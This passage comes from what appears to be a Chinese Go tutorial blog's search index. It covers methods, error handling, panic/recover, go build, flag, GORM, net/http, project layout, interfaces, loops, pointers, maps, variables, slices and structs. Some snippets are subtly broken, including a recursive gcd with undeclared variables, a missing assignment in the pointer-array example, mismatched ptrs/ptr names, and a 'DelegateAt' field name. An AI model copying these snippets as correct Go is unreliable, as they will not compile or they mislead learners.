&#123;   radius float64&#125;func (c Circle) getArea() float64  &#123;   return c.radius * c.radius * 3.14&#125;// 注意如果想要更改成功c的值，这里需要传指针func (c *Circle) changeRadius(radius float64)  &#123;   c.radius = radius&#125;   // 以下操作将不生效// func (c Circle) changeRadius(radius float64)  &#123;//   c.radius = radius// &#125;// 引用类型要想改变值需要传指针func change(c *Circle, radius float64)  &#123;   c.radius = radius&#125;func main()  &#123;    var c Circle   fmt.Println(c.radius) // 0   c.radius = 10.00   fmt.Println(c.getArea()) // 314   c.changeRadius(20)   fmt.Println(c.radius) // 20   change(&amp;c, 30)   fmt.Println(c.radius) // 30&#125;\n函数实例返回m,n的最大公因数，最小公倍数\npackage mainimport &quot;fmt&quot;// 循环func gcd(a int, b int) int &#123;   for b != 0 &#123;        a, b = b, a%b   &#125;   return a&#125;//递归/* func gcd(a int, b int) int &#123;    if a &gt; b &#123;       val = b\t\ttem = a\t&#125; else &#123;      val = a\t\ttem = b\t&#125;\tif tem%val != 0 &#123;      val = gcd(val, tem-val)\t&#125;\treturn val&#125;*/func lcm(a int, b int) int &#123;   return a * b / gcd(a, b)   &#125;\n\n\nGo语言标准库提供了多种可动用的内置的函数。例如，len() 函数可以接受不同类型参数并返回该类型的长度。如果我们传入的是字符串则返回字符串的长度；如果传入的是数组，则返回数组中包含的元素个数。\n\n","categories":["Golang"]},{"title":"错误处理","url":"/2023/05/27/Golang/go-error/","content":"\n错误处理Go 语言通过内置的错误接口提供了非常简单的错误处理机制。\nerror 类型是一个接口类型，定义如下：\ntype error interface &#123;    Error() string&#125;\n常通过实现error接口来生成错误信息；也可以使用errors.New返回一个错误信息。\npackage mainimport (    &quot;fmt&quot;)// 定义一个 DivideError 结构type DivideError struct &#123;    dividee int    divider int&#125;// 实现 `error` 接口func (de *DivideError) Error() string &#123;    strFormat := `    Cannot proceed, the divider is zero.    dividee: %d    divider: 0`    return fmt.Sprintf(strFormat, de.dividee)&#125;// 定义 `int` 类型除法运算的函数func Divide(varDividee int, varDivider int) (result int, errorMsg string) &#123;    if varDivider == 0 &#123;            dData := DivideError&#123;                    dividee: varDividee,                    divider: varDivider,            &#125;            errorMsg = dData.Error()            return    &#125; else &#123;            return varDividee / varDivider, &quot;&quot;    &#125;&#125;func main() &#123;    // 正常情况    if result, errorMsg := Divide(100, 10); errorMsg == &quot;&quot; &#123;            fmt.Println(&quot;100/10 = &quot;, result)    &#125;    // 当除数为零的时候会返回错误信息    if _, errorMsg := Divide(100, 0); errorMsg != &quot;&quot; &#123;            fmt.Println(&quot;errorMsg is: &quot;, errorMsg)    &#125;&#125;// 100/10 =  10/** errorMsg is:      Cannot proceed, the divider is zero.    dividee: 100    divider: 0*/\n介绍一下 panic 与 recover,一个用于主动抛出错误，一个用于捕获panic抛出的错误。\n两者都是Go中内置函数，用于处理Go运行时的错误。\n引发panic有两种情况，一是程序主动调用；二是程序产生运行时错误，由运行时检测并退出。\n发生panic后，程序会从调用panic的函数位置或发生panic的地方立即返回，不再执行后面的代码。立即逆序执行defer语句，然后逐层打印函数调用堆栈，并逐级往外层函数栈扩散；直到被recover捕获或运行到最外层函数。\npanic不但可以在函数正常流程中抛出，在defer逻辑里也可以再次调用panic或抛出panic。defer里面的panic能够被后续执行的defer捕获。\nrecover用来捕获panic，阻止panic继续向上传递。recover()可以和defer一起使用，defer 需要在 panic 之前声明，否则由于 panic 之后的代码得不到执行，因此也无法 recover捕获到，返回nil，异常继续向外传递。\n\n使用场景：\n\n程序遇到无法执行的错误时，抛出错误，主动结束运行。\n在debug时，通过panic打印堆栈，用于定位错误\n\n\n//以下捕获失败defer recover()defer fmt.Prinntln(recover)defer func()&#123;    func()&#123;        recover() //无效，嵌套两层    &#125;()&#125;()//以下捕获有效defer func()&#123;    recover()&#125;()func except()&#123;    recover()&#125;func test()&#123;    defer except()    panic(&quot;runtime error&quot;)&#125;\n\n// recover与deferpackage mainimport (&quot;fmt&quot;)func main() &#123;  fmt.Println(&quot;外层开始&quot;)  defer func() &#123;    fmt.Println(&quot;外层准备recover&quot;)    if err := recover(); err != nil &#123;      fmt.Printf(&quot;%#v-%#v\\n&quot;, &quot;外层&quot;, err) // err已经在上一级的函数中捕获了，这里没有异常，只是例行先执行defer，然后执行后面的代码    &#125; else &#123;      fmt.Println(&quot;外层没做啥事&quot;)    &#125;    fmt.Println(&quot;外层完成recover&quot;)  &#125;()  fmt.Println(&quot;外层即将异常&quot;)  f()  fmt.Println(&quot;外层异常后&quot;)  defer func() &#123;    fmt.Println(&quot;外层异常后defer&quot;)  &#125;()&#125;func f() &#123;  fmt.Println(&quot;内层开始&quot;)  defer func() &#123;    fmt.Println(&quot;内层recover前的defer&quot;)  &#125;()  defer func() &#123;    fmt.Println(&quot;内层准备recover&quot;)    if err := recover(); err != nil &#123;      fmt.Printf(&quot;%#v-%#v\\n&quot;, &quot;内层&quot;, err) // 这里err就是panic传入的内容    &#125;    fmt.Println(&quot;内层完成recover&quot;)  &#125;()  defer func() &#123;    fmt.Println(&quot;内层异常前recover后的defer&quot;)  &#125;()  panic(&quot;异常信息&quot;)  defer func() &#123;    fmt.Println(&quot;内层异常后的defer&quot;)  &#125;()  fmt.Println(&quot;内层异常后语句&quot;) //recover捕获的一级或者完全不捕获这里开始下面代码不会再执行&#125;","categories":["Golang"]},{"title":"GO项目部署","url":"/2025/08/13/Golang/go-deploy/","content":"Go 项目打包部署Go buildgo build 是Golang提供的命令，会将main.go涉及到的文件都编译打包好，放在当前目录下，可以通过参数 -o 指定生成的二进制文件名。\n可以打包成exe后缀文件，在Windows上直接运行\ngo build main.go\n可以打包成二进制文件，在linux平台运行\n这里通常需要使用两个变量，GOOS 目标操作系统，支持以下操作系统：darwin freebsd linux windows android dragonfly netbsd openbsd plans solaris\nGOARCH 目标处理器，支持以下处理器架构 arm64 arm 386 amd64 ppc64 ppc64le mips64 mips64le s390x\n设置好后，就能够通过go build在当前目录下生成对应的可执行二进制文件了\n通常可能需要使用 chmod 773 赋予文件权限 再进行执行。\n一些编译参数\n-x-n-a-o-p-work-race-installsuffix\n","categories":["Golang"]},{"title":"标准库——flag","url":"/2025/08/22/Golang/go-flag/","content":"AbstractGo 语言的 flag 包提供了一个简单的命令行参数解析器。它支持定义标志（flags），解析命令行参数，并生成帮助信息。\nflag库的基本使用\npackage mainimport (    &quot;flag&quot;    &quot;fmt&quot;)func main() &#123;    // 定义命令行标志    wordPtr := flag.String(&quot;word&quot;, &quot;foo&quot;, &quot;a string&quot;)    numbPtr := flag.Int(&quot;numb&quot;, 42, &quot;an int&quot;)    boolPtr := flag.Bool(&quot;fork&quot;, false, &quot;a bool&quot;)    // 自定义标志    var svar string    flag.StringVar(&amp;svar, &quot;svar&quot;, &quot;bar&quot;, &quot;a string var&quot;)    // 解析命令行标志    flag.Parse()    // 输出标志的值    fmt.Println(&quot;word:&quot;, *wordPtr)    fmt.Println(&quot;numb:&quot;, *numbPtr)    fmt.Println(&quot;fork:&quot;, *boolPtr)    fmt.Println(&quot;svar:&quot;, svar)    fmt.Println(&quot;tail:&quot;, flag.Args())&#125;\n不设置某个选项，相应变量会取默认值。\n","categories":["Golang"]},{"title":"GORM","url":"/2025/08/07/Golang/go-gorm/","content":"GORM是什么GORM是go中的ORM库，用于简化数据库操作。\n快速上手GORM只需了解它的安装、连接、模型定义、创建表、CRUD操作\n\n安装GORM\n 首先，使用go get命令安装GORM：\n\n\ngo get -u gorm.io/gormgo get -u gorm.io/driver/mysql\n上述命令会安装GORM以及MySql数据库驱动（如需使用其他数据库可查阅相关\n\n\n连接数据库\n 连接数据库的常见形式主要有以下几种：\n\n\ndsn := &quot;user:password@tcp(127.0.0.1:3306)/database?charset=utf8mb4&amp;parseTime=True&amp;loc=Local&quot;db, err := gorm.Open(mysql.Open(dsn), &amp;gorm.Config&#123;&#125;)if err != nil &#123;    panic(&quot;failed to connect database&quot;)&#125;\n\n着重注意的就是user,password,database为自己的数据库用户名、登录密码、库名配置。3. 定义模型    模型是Go结构体，对应数据库表\n\ntype Product struct &#123;    gorm.Model    Code string    Price float64&#125;\ngorm.Model 包含了ID，CreateAt，UpdateAt，DelegateAt字段\n\n\n自动迁移\n Gorm 可以自动根据模型创建表\n\n\ndb.AutoMigrate(&amp;Product&#123;&#125;)\n\nCRUD操作\n\n\n\n","categories":["Golang"]},{"url":"/2025/08/01/Golang/go-http/","content":"Go语言Http包学习go中net&#x2F;http包中，提供了HTTP客户端和服务端的实现。提供了HTTP通信过程中各种对象的定义及实现。\n对于客户端，可以使用Get、Post、Head和PostForm等方法发送对应的HTTP请求，也可以通过Client类型自定义客户端，从而调用其中方法发送HTTP请求。\n// 直接发送请求，并接受响应resp, err := http.Get(&quot;http://example.com&quot;)resp, err := http.PostForm(&quot;http://example.com&quot;,    url.Values&#123;&quot;key&quot;: &#123;&quot;Value&quot;&#125;, &quot;id&quot;: &#123;&quot;123&quot;&#125;&#125;)// 客户端必须显示关闭响应体defer resp.Body.Close()\n\n// 自定义客户端client := &amp;http.Client&#123;    Timeout: 10 * time.Second, // 设置超时时间    CheckRedirect: redirectFunc,    // 设置重定向处理函数&#125;resp, err := client.Get(&quot;http://example.com&quot;)// 也可以预生成请求，然后使用客户端发送req, err := http.NewRequest(&quot;GET&quot;, &quot;http://example.com&quot;, nil)// ...req.Header.Add(&quot;If-None-Match&quot;, &quot;abc123&quot;)resp, err := client.Do(req)// ...\n对于传输过程，它提供了支持代理，TLS配置，keep-alive，压缩等传输方式的Transport类型。\n对于服务端，它提供了ListenAndServe方法使用给定的地址和处理程序启动HTTP服务器，同时提供了Server类型用于自定义服务端及处理请求的函数\nhttp.Handle(&quot;/foo&quot;, fooHandler)http.HandleFunc(&quot;/bar&quot;, barHandler)\n"},{"title":"Golang 项目布局","url":"/2025/08/25/Golang/go-layout/","content":"Golang 项目布局在 Go 语言中，项目布局（Project Layout）是指如何组织和结构化代码文件和目录，以便于开发、维护和协作。一个良好的项目布局可以提高代码的可读性、可维护性和可扩展性。\n常见的项目布局结构以下是一个常见的 Go 项目布局结构示例：\nmyproject/├── cmd/                # 主应用程序目录│   └── myapp/         # 每个子目录对应一个可执行文件│       └── main.go    # 主程序入口├── pkg/                # 可重用的库代码│   └── mylib/        # 每个子目录对应一个库│       └── mylib.go   # 库代码├── internal/          # 私有库代码，不能被外部使用│   └── myinternal/   # 每个子目录对应一个私有库│       └── myinternal.go # 私有库代码├── api/                # API 定义和协议文件│   └── v1/           # 版本化的 API│       └── api.proto  # API 协议文件├── web/                # Web 相关文件（HTML、CSS、JS）│   └── static/       # 静态资源│       └── style.css  # 样式文件├── configs/           # 配置文件│   └── config.yaml   # 配置文件├── scripts/           # 构建和部署脚本│   └── build.sh      # 构建脚本├── test/              # 测试代码│   └── myapp_test.go # 测试文件├── go.mod             # Go 模块文件├── go.sum             # Go 模块校验文件└── README.md         # 项目说明文件\n说明\ncmd/ 目录包含主应用程序的代码，每个子目录对应一个可执行文件。\npkg/ 目录包含可重用的库代码，可以被其他项目导入使用。\ninternal/ 目录包含私有库代码，这些代码只能在当前项目中使用，不能被外部项目导入。\napi/ 目录包含 API 定义和协议文件，通常用于定义服务的接口。\nweb/ 目录包含与 Web 相关的文件，如 HTML、CSS 和 JavaScript。\nconfigs/ 目录包含配置文件，用于存储应用程序的配 置参数。\nscripts/ 目录包含构建和部署脚本，帮助自动化项目的构建和部署过程。\ntest/ 目录包含测试代码，用于验证应用程序的功能和性能。\ngo.mod 和 go.sum 文件用于管理 Go 模块和依赖。\nREADME.md 文件用于提供项目的说明和文档。\n\n&#x2F;cmd项目的主干，每个应用程序的目录名应该与你想要的可执行文件的名称相匹配。专门放main func 以便go build\n&#x2F;pkg外部应用程序可以使用的库代码，其他项目会导入这些库。可以参考go 标准库的组织方式，按照功能分类。&#x2F;internal&#x2F;pkg一般用于项目内的跨多个应用的公共共享代码，但其作用域仅在单个项目工程内。\n&#x2F;internal专门放不允许外部import的pkg，代码不是可重用的。私有的应用程序和代码库。并不局限于顶级目录，在项目树的任何级别上都可以有多个内部目录。\n&#x2F;apiAPI协议定义目录，service.proto protobuf文件，以及生成的go文件。通常把api文档直接在proto文件中描述。\n&#x2F;configs配置文件模板或默认配置\n&#x2F;test额外的外部测试应用程序和测试数据。可以随机根据需求构造，对于较大项目，有个数据子目录是有意义的，\n服务内部目录&#x2F;data业务数据访问，包含cache、db等封装，实现了 biz 的 repo 接口。我们可能会把 data 与 dao 混淆在一起，data 偏重业务的含义，它所要做的是将领域对象重新拿出来，我们去掉了 DDD 的 infra 层。\n各类package的实现在顶层目录package通常取目录名称一样且不要取像 util、model 这种在写Java时常用的pattern。需要更有具体功能的名称如果是要設計本來就是 for library 的方式且是不會有過多的 package 的小型專案，可以採用只需要定義 package 在根目錄上就可以了如果不需要可執行檔，那麼 cmd 目錄當然也不需要docs 目錄也是根據專案的大小而定，我覺得見仁見智。  \n结论参考连接\nhttps://blog.kennycoder.io/2022/08/20/Golang-%E8%AB%87%E8%AB%87-project-layout/\n\n\n","categories":["Golang"]},{"title":"Golang接口","url":"/2023/05/05/Golang/go-interface/","content":"接口是一种数据类型：把所有共性的方法定义在一起，任何其他类型只要实现了这些方法就是实现了这个接口。\n接口能够在一组公共的方法上绑定其他不同类型的数据，从而实现多态和更灵活的设计\n接口在Go中是隐式实现的。\n示例// 定义接口type interface_name interface &#123;    method1_name [return_type]    method2_name []    ...&#125;/* 定义结构体 */type struct_name struct &#123;   /* variables */&#125;/* 实现接口方法 */func (struct_name_variable struct_name) method1_name() [return_type] &#123;   /* 方法实现 */&#125;func (struct_name_variable struct_name) method2_name() [return_type] &#123;   /* 方法实现*/&#125;...\n\n实例\n接口类型变量可以存储任何实现了该接口的类型的值。\n\n接口类型转换\n类型断言将接口类型转换为指定类型：value.(type)或value.(T)\n如果类型断言成功，它将返回转换后的值和一个布尔值，表示转换是否成功。\n\n类型转换\n\n\n将一个接口类型的值转换为另一个接口类型：T(value)\n在类型转换中，我们必须保证要转换的值和目标接口类型之间是兼容的。\npackage mainimport &quot;fmt&quot;func main() &#123;   var i interface&#123;&#125; = &quot;Hello, World&quot;   str, ok := i.(string)   if ok &#123;      fmt.Printf(&quot;&#x27;%s&#x27; is a string\\n&quot;, str)   &#125; else &#123;      fmt.Println(&quot;conversion failed&quot;)   &#125;&#125;// 例二type Writer interface &#123;    Write([]byte) (int, error)&#125;type StringWriter struct &#123;    str string&#125;func (sw *StringWriter) Write(data []byte) (int, error) &#123;    sw.str += string(data)    return len(data), nil&#125;func main() &#123;    var w Writer = &amp;StringWriter&#123;&#125;    sw := w.(*StringWriter)    sw.str = &quot;Hello, World&quot;    fmt.Println(sw.str)&#125;\n","categories":["Golang"]},{"title":"循环语句","url":"/2023/05/27/Golang/go-loopStatement/","content":"循环语句for循环for循环是一个循环控制结构，可以执行指定次数的循环。\nGo语言的For循环有3种形式，只有其中的一种使用分号。\n与C一样for init; condition; post &#123; &#125;  \n\n先对表达式1赋初值；\n判别赋值表达式init是否满足给定条件，若满足循环条件，则执行循环体内语句，然后执行post，进入第二次循环，再判别condition；否则不满足条件，就终止for循环，执行循环体外语句。\n\n与C的while一样for condition &#123; &#125;\n与C的for(;;)一样for &#123; &#125;\nfor rangefor循环的range格式可以对slice、map、数组、字符串等进行迭代循环。格式如下：\nfor key, value := range oldMap &#123;    newMap[key] = value&#125;\n如果只想读取 key，格式如下：\nfor key := range oldMap\n或者这样：\nfor key, _ := range oldMap\n如果只想读取 value，格式如下：\nfor _, value := range oldMap  //必须使用_来占位\n循环嵌套在循环内使用循环。\n以下为 Go 语言嵌套循环的格式：\nfor [condition |  ( init; condition; increment ) | Range]&#123;   for [condition |  ( init; condition; increment ) | Range]   &#123;      statement(s);   &#125;   statement(s);&#125;\n实例输出100内的所有素数\npackage mainimport &quot;fmt&quot;func main() &#123;   var i, j int   for i=2; i &lt; 100; i++ &#123;      for j=2; j &lt;= (i/j); j++ &#123;         if(i%j==0) &#123;            break; // 如果发现因子，则不是素数         &#125;      &#125;      if(j &gt; (i/j)) &#123;         fmt.Printf(&quot;%d  是素数\\n&quot;, i);      &#125;   &#125;  &#125;\n无限循环如果循环中条件语句永远不为false则会进行无限循环，我们可以通过for循环语句中只设置一个条件表达式来执行无限循环\n循环控制语句break语句Go语言中break语句用于以下两方面：\n\n用于循环语句中跳出循环，并开始执行循环之后的语句。\nbreak在switch（开关语句）中在执行一条case后跳出语句的作用。\n在多重循环中，可以用标号label标出想break的循环。\n\n\n在Go语言中，break语句在select语句中的应用是相对特殊的。由于select语句的特性，break语句并不能直接用于跳出select语句本身，因为 select 语句是非阻塞的，它会一直等待所有的通信操作都准备就绪。如果需要提前结束 select 语句的执行，可以使用return或者goto语句来达到相同的效果。\n\ncontinue语句跳过当前循环的剩余语句，然后继续进行下一轮循环。\n\nfor循环中，执行continue语句会触发for增量语句的执行。\n在多重循环中，可以用标号label标出想continue的循环。\n\ngoto语句Go 语言的goto语句可以无条件地转移到过程中指定的行。\ngoto 语句通常与条件语句配合使用。可用来实现条件转移， 构成循环，跳出循环体等功能。\n但是，在结构化程序设计中一般不主张使用goto语句， 以免造成程序流程的混乱，使理解和调试程序都产生困难。\n语法格式goto label;...label: statement;\n实例package mainimport &quot;fmt&quot;func main() &#123;   var a int = 10   /* 循环 */   LOOP: for a &lt; 20 &#123;      if a == 15 &#123;         /* 跳过迭代 */         a = a + 1         goto LOOP      &#125;      fmt.Printf(&quot;a的值为 : %d\\n&quot;, a)      a++       &#125;  &#125;\n","categories":["Golang"]},{"title":"Golang指针","url":"/2023/05/05/Golang/go-pointer/","content":"在使用指针前你需要声明指针：var name *type\ntype为指针类型，name为指针变量名，*号用于指定变量是一个指针。\n空指针：当一个指针被定义后没有分配到任何变量时，它的值为nil\n指针数组存储数组的值：var ptr [MAX]*int\nptr为整型指针数组，每个元素都指向了一个值：\nnumbers := [3]int&#123;1,2,3&#125;var ptrs [3]*intfor i = 0; i &lt; 3; i ++ &#123;    // 把整数地址赋值给指针数组    ptr[i] = &amp;numbers[i]&#125;for i = 0; i &lt; 3; i++ &#123;    fmt.Printf(&quot;numbers[%d] = %d\\n&quot;, i, *ptr[i])&#125;// numbers[0] = 1// numbers[1] = 2// numbers[2] = 3\n\n创建指针数组的时候，不应该用range循环\nnumber := [3]int&#123;1,2,3&#125;var ptrs [3]*int// 数组赋值for i, x := range &amp;number &#123;    ptrs[i] &amp;x&#125;for i, x := range ptrs &#123;    fmt.Printf(&quot;指针数组：index:%d value:%d\\n&quot;, i, *x)&#125;// 指针数组：index:0 value:3// 指针数组：index:1 value:3// 指针数组：index:2 value:3\n\n\n这个问题是range循环的实现逻辑引起的。跟for循环不一样的地方在于range循环中的x变量是临时变量，仅被声明一次，此后都是将迭代 number 出的值赋值给 x ， x 变量的内存地址始终未变，这样再将 x 的地址发送给 ptrs 数组，自然也是相同的。\n\n指针的指针如果一个指针变量存放的又是另一个指针变量的地址，则称这个指针变量为指向指针的指针变量。\n当定义一个指向指针的指针变量时，第一个指针存放第二个指针的地址，第二个指针存放变量的地址：\nvar ptr **int声明了一个指针的指针变量的整型\n访问指向指针的指针变量值需要使用两个*号\npackage mainimport &quot;fmt&quot;func main() &#123;   var a int   var ptr *int   var pptr **int   a = 3000   /* 指针 ptr 地址 */   ptr = &amp;a   /* 指向指针 ptr 地址 */   pptr = &amp;ptr   /* 获取 pptr 的值 */   fmt.Printf(&quot;变量 a = %d\\n&quot;, a )   fmt.Printf(&quot;指针变量 *ptr = %d\\n&quot;, *ptr )   fmt.Printf(&quot;指向指针的指针变量 **pptr = %d\\n&quot;, **pptr)&#125;\n\n多级指针本质上就是一个指针链。可以通过下面的方法输出验证：\nfunc test() &#123;    var p3 ***int = &amp;pptr    fmt.Printf(&quot;一级指针ptr的值：%d，ptr的目标地址：%d\\n&quot;, ptr , *ptr)    fmt.Printf(&quot;二级指针pptr的值：%d，pptr的目标地址：%d，pptr的链尾目标地址：%d\\n&quot;, pptr , *pptr, **pptr)    fmt.Printf(&quot;三级指针p3的值：%d，p3的目标地址：%d，下一个目标地址：%d，p3的链尾目标地址：%d\\n&quot;, p3 , *p3, **p3, ***p3)&#125;\n\n作为函数参数经常将指针作为函数参数，并在函数调用中修改\n","categories":["Golang"]},{"title":"Golang映射","url":"/2023/05/05/Golang/go-map/","content":"定义Map\nmake函数\n\nmap := make(map[KeyType]ValueType, cap)2. map关键字\n m := map[string]int&#123;&quot;apple&quot;: 1, &quot;banana&quot;:2&#125;\n基本操作package mainimport &quot;fmt&quot;func main() &#123;   var siteMap map[string]string /*创建集合 */   siteMap = make(map[string]string)   /* map 插入 key - value 对,各个国家对应的首都 */   siteMap [ &quot;Google&quot; ] = &quot;谷歌&quot;   siteMap [ &quot;Runoob&quot; ] = &quot;菜鸟教程&quot;   siteMap [ &quot;Baidu&quot; ] = &quot;百度&quot;   siteMap [ &quot;Wiki&quot; ] = &quot;维基百科&quot;   // 遍历Map   for site := range siteMap &#123;      fmt.Println(site, &quot;首都是&quot;, siteMap [site])   &#125;   // 获取元素   v1 := siteMap[ &quot;Google&quot; ]   // 修改元素   siteMap[ &quot;Wiki&quot; ] = &quot;维基&quot;   // 获取Map的长度   len := len(siteMap)   /*查看元素在集合中是否存在 */   name, ok := siteMap [ &quot;Facebook&quot; ] /*如果确定是真实的,则存在,否则不存在 */   /*fmt.Println(capital) */   /*fmt.Println(ok) */   if (ok) &#123;      fmt.Println(&quot;Facebook 的 站点是&quot;, name)   &#125; else &#123;      fmt.Println(&quot;Facebook 站点不存在&quot;)   &#125;&#125;\n\ndelete()函数package mainimport &quot;fmt&quot;func main() &#123;   /* 创建map */   countryCapitalMap := map[string]string&#123;&quot;France&quot;: &quot;Paris&quot;, &quot;Italy&quot;: &quot;Rome&quot;, &quot;Japan&quot;: &quot;Tokyo&quot;, &quot;India&quot;: &quot;New delhi&quot;&#125;   fmt.Println(&quot;原始地图&quot;)   /* 打印地图 */   for country := range countryCapitalMap &#123;      fmt.Println(country, &quot;首都是&quot;, countryCapitalMap [ country ])   &#125;   /*删除元素*/    delete(countryCapitalMap, &quot;France&quot;)   fmt.Println(&quot;法国条目被删除&quot;)   fmt.Println(&quot;删除元素后地图&quot;)   /*打印地图*/   for country := range countryCapitalMap &#123;      fmt.Println(country, &quot;首都是&quot;, countryCapitalMap [ country ])   &#125;&#125;\n","categories":["Golang"]},{"title":"变量与常量","url":"/2023/05/25/Golang/go-variable/","content":"变量变量声明var关键字\n第一种指定变量类型，如果没有初始化，则变量默认为零值。\n\n零值就是变量没有做初始化时系统默认设置的值。数值类型（包括complex64&#x2F;128）为0布尔类型为false字符串为 &quot;&quot;（空字符串）以下几种类型为nil：指针、数组、map、channel、函数、接口\n\n第二种根据值自行判定变量类型。\n第三种格式：v_name := value\n如果变量已经使用var声明过了，再使用:=声明变量，就产生编译错误。\n\n多变量声明var vname1, vname2, vname3 type 相同类型的多个变量vname1, vname2, vname3 = v1, v2, v3 \nvar vname1, vname2, vname3 = v1, v2, v3自动推断类型  \n一般用于声明全局变量var {    vname type1    vname type2}\n\n注意事项如果你在定义变量a之前使用它，则会得到编译错误undefined: a\n如果你声明了一个局部变量却没有在相同的代码块中使用它，同样会得到编译错误，a declared but not used；但是全局变量是允许声明但不使用的。\n如果你想要交换两个变量的值，则可以简单地使用a, b = b, a，两个变量的类型必须是相同。这被称为并行或同时赋值。\n并行赋值也被用于当一个函数返回多个返回值时，比如这里的val和错误err是通过调用Func1函数同时得到：val, err = Func1(var1)\n空白标识符_也被用于抛弃值，如值5在：_, b = 5, 7中被抛弃。\n变量作用域Go语言中变量可在三个地方中声明\n\n函数内定义：局部变量\n函数外定义：全局变量\n函数定义中：形式参数\n\n局部变量的作用域只在函数体内，参数和返回值变量也是局部变量。\n全局变量可以在整个包甚至外部包（被导出后）使用。\nGo语言程序中全局变量与局部变量名称可以相同，但是函数内的局部变量会被优先考虑。\n形式参数会作为函数的局部变量来使用。\n\n可通过花括号来控制变量的作用域，花括号中的变量是单独的作用域，同名变量会覆盖外层。\n\n常量常量是一个简单值的标识符，在程序运行时，不会被修改的量。\n常量中的数据类型只可以是布尔型、数字型（整数型、浮点型和复数）和字符串型。\n常量的定义格式：const identifier [type] = value  \n\n你可以省略类型说明符[type]，编译器可以根据变量的值来推断其类型。\n\n显式类型定义：const b string = &quot;abc&quot;\n隐式类型定义：const b = &quot;abc&quot;多个相同类型的声明可以简写为：const c_name1, c_name2 = value1, value2\n\n\n实例package mainimport &quot;fmt&quot;func main() &#123;    const LENGTH int = 2    const WIDTH int = 6    var area int    const a, b, c = 1, false, &quot;str&quot; //多重赋值    const (        Unknow = 0        Female = 1        Male = 2    ) //枚举赋值    area = LENGTH * WIDTH    fmt.Printf(&quot;面积为：%d\\n&quot;, area)    println(a, b, c)&#125;\n\n常量可以用len(), cap(), unsafe.Sizeof()函数计算表达式的值。常量表达式中，函数必须是内置函数，否则编译不过。\n\niotaiota，特殊常量，可认为是一个可以被编译器修改的常量。\niota在const关键字出现时将被重置为 0(const 内部的第一行之前)，const 中每新增一行常量声明将使 iota 计数一次(iota 可理解为 const 语句块中的行索引)。\n\n\n值类型和引用类型使用值类型的变量直接指向存在内存中的值，一个引用类型的变量r1存储的是r1的值所在的内存地址（数字），或内存地址中第一个字所在的位置。也称指针&amp;符号取变量的内存地址。值类型变量使用等号=将一个变量的值赋值给另一个变量时，实际上是在内存中将 i 的值进行了拷贝，使用赋值语句r2 = r1时，只有引用（地址）被复制。对r1的修改也会对r2产生影响\n&#x2F;&#x2F;\n","categories":["Golang"]},{"title":"Golang切片","url":"/2023/05/05/Golang/go-slice/","content":"切片就是对数组的抽象，提供了一种更加灵活，功能强大的“动态数组”。\n定义切片\n声明一个未指定大小的数组var identifier []type\n使用make()函数创建var slice []type = make([]type, len)或者通过内置函数make()初始化切片ss :=make([]int,len,cap),[]int标识为其元素类型为int的切片。make()函数这里容量可选\n\n切片的初始化切片可以直接通过数组来初始化，也可以通过内置函数make()初始化。\n初始化时默认len=cap，在追加元素时如果容量cap不足时将按len的2倍扩容。\ns :=[] int &#123;1,2,3 &#125;直接初始化切片，[]表示是切片类型，&#123;1,2,3&#125;初始化值依次是1,2,3。其cap=len=3。\ns := arr[:]初始化切片s，是数组arr的引用。\ns := arr[startIndex:endIndex]将arr中从下标startIndex 到 endIndex-1下的元素创建为一个新的切片。（不包含endIndex）\ns := arr[startIndex:]缺少endIndex时将表示一直到arr的最后一个元素。\ns := arr[:endIndex]缺少startIndex时将表示从arr的第一个元素开始。\ns1 := s[startIndex:endIndex]通过切片s初始化切片s1\n内置函数\n\n\n名称\n说明\n\n\n\nlen()\n获取切片长度\n\n\ncap()\n切片最大容量\n\n\nappend()\n追加元素\n\n\ncopy()\n拷贝\n\n\n示例package mainimport &quot;fmt&quot;func main() &#123;   numbers := []int&#123;0,1,2,3,4,5,6,7,8,9&#125;   number1:=make([]int,0,5)   number2:=numbers[:3]   number3:=numbers[2:5]   number4:=numbers[3:8]   // cap的大小与截取的位置有关   // number3 的 ptr 指向第三个元素，后面还剩8个元素所以cap=8   // number4 的 ptr 指向第四个元素，后面还剩7个元素所以cap=7   printSlice(numbers)  //len=10  cap=10 slice=[0 1 2 3 4 5 6 7 8 9]   printSlice(number1)  //len=0  cap=5 slice=[]   printSlice(number2)  //len=3  cap=10 slice=[0 1 2]   printSlice(number3)  //len=3  cap=8 slice=[2 3 4]   printSlice(number4)  //len=5  cap=7 slice=[3 4 5 6 7]   // append()   // 允许追加空切片   numbers = append(numbers, 0)   // 向切片添加一个或多个元素   numbers = append(numbers, 11,12)   // copy()   // 创建切片newNumbers是之前切片的两倍   newNumbers := make([]int, len(numbers), (cap(numbers))*2)   copy(newNumbers, numbers)   printSlice(newNumbers)   &#125;func printSlice(x []int) &#123;   fmt.Printf(&quot;len=%d  cap=%d   slice=%v\\n&quot;,len(x),cap(x),x)&#125;\n","categories":["Golang"]},{"title":"Golang结构体","url":"/2023/05/05/Golang/go-structure/","content":"结构体是有一系列具有相同类型或不同类型的数据构成的集合体。\n定义结构体type和struct的使用，type设定了结构体的名称，struct定义一个新的数据类型。格式如下：\ntype struct_variable struct &#123;    member definition    member definition    ...    member definition&#125;\n\n定义了结构体类型，它才能用于声明一个变量：\nvar name struct_variable&#123;value1, value2, value3, ...&#125;\n或\nvar name struct_variable&#123; key1: value1, key2: value2, key3: value3, ...&#125;\n访问结构体成员使用.操作符，格式为：\n结构体.成员名\n\n结构体指针用于存储结构体变量的地址，查看、修改结构体变量的成员，同其他类型指针一样，在结构体变量前使用&amp;符合可以查看结构体变量地址。\n结构体作函数参数结构体可以像其他数据类型一样作为参数传递给函数，是值传递。\n如果想在函数体内改变结构体内容，需要使用指针\n\n当要将结构体对象转换为 JSON 时，对象中的属性首字母必须是大写，才能正常转换为 JSON。（首字母大写相当于public，小写则相当于private。这个public，private是对于包而言）可以使用tag标记要返回的字段名。\n\n","categories":["Golang"]},{"title":"Go环境安装","url":"/2023/05/05/Golang/go_env/","content":"Go语言开发了适用于以下操作系统的编译器：\n\nLinux\nFreeBSD\nMac OS X\n\n环境安装\n添加PATH变量\nGo 开发环境依赖于一些操作系统环境变量，你最好在安装 Go 之前就已经设置好他们。\n这里列举几个最为重要的环境变量：\n\n$GOROOT表示Go在你的电脑上的安装位置，它的值一般都是 $HOME/go，当然，你也可以安装在别的地方。\n$GOPATH默认采用和$GOROOT一样的值，但从Go 1.1版本开始，你必须修改为其它路径。它可以包含多个Go语言源码文件、包文件和可执行文件的路径，而这些路径下又必须分别包含三个规定的目录：src、pkg 和 